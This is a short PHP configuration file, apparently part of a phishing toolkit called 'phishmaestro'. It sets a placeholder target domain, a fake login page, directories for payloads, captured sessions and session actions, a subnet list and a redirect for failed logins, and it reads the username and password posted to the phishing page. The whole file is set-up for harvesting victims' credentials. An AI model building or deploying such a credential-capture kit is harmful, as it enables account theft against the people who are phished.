<?php

 $webURL = 'https://www.THEDOMAIN.com';
 $webDIR = '/var/www/html';
 $pmDIR = "phishmaestro";

 $failedLoginURL = "$webURL/login.htm";

 # Phishing Site Parameters
 $loginURL =  $webURL . "/index.html"; 
 $payloadDir = "$webDIR/$pmDIR/payloads";

 $sQueueDir =  "$webDIR/$pmDIR/sessions-queue"; 
 $sActionDir = "$webDIR/$pmDIR/session-actions";
 $subnetFile = "$webDIR/$pmDIR/subnet.list.txt";

 # Parameters from your phishing site
 $user = $_POST['username'];
 $pass = $_POST['password'];


 $sleepTime = "1";


 ?>